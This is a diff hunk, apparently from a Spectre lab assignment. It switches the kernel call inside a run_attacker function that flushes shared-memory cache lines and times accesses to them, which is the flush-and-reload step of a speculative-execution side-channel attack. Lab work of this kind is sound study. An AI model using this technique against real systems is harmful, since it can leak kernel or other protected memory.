@@ -59,7 +59,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
                 clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
             }
             
-            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+            call_kernel_part2(kernel_fd, shared_memory, current_offset);
 
             for (int i = 0; i < 256; i++) {
                 uint64_t access_time = time_access(&shared_memory[i*SHD_SPECTRE_LAB_PAGE_SIZE]);
